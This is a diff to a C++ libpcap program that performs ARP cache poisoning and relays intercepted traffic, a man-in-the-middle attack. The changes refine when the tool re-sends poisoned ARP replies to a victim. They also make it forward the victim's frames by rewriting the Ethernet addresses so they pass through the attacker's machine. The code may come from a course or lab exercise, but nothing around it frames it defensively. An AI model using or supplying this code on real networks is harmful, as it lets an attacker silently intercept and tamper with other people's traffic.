@@ -290,14 +290,14 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
         if (ethhdr->type() == EthHdr::Arp) {
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt ARP request
-            cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
-            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->op() == ArpHdr::Request)
+            //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
+            if ((ethhdr->dmac() == Mac::broadcastMac() || ethhdr->dmac() == attack_mac)
+                && ethhdr->smac() == sender_mac && arp_pkt->op() == ArpHdr::Request)
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                         return false;
                     }
-
                 cout << "infected\n";
             }
         }
@@ -308,10 +308,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             memcpy(buf.get(), recv_pkt, len);
 
             EthHdr* eth = reinterpret_cast<EthHdr*>(buf.get());
-            IpHdr* iphdr = reinterpret_cast<IpHdr*>(buf.get() + sizeof(EthHdr));
-            cout << string(iphdr->sip()) << " ?= " << string(sender_ip) << endl;
-            cout << string(iphdr->dip()) << " ?= " << string(target_ip) << endl;
-            if ((iphdr->sip()) == sender_ip)
+            if ((eth->smac() == sender_mac && eth->dmac() == attack_mac)) //sender send
             {
                 eth->smac_ = attack_mac;
                 eth->dmac_ = target_mac;
@@ -319,7 +316,6 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                 {
                     lock_guard<mutex> lk(pcap_mutex);
                     int res = pcap_sendpacket(pcap, buf.get(), len);
-                    cout << "sent" << '\n';
                     if (res != 0) {
                         fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
 
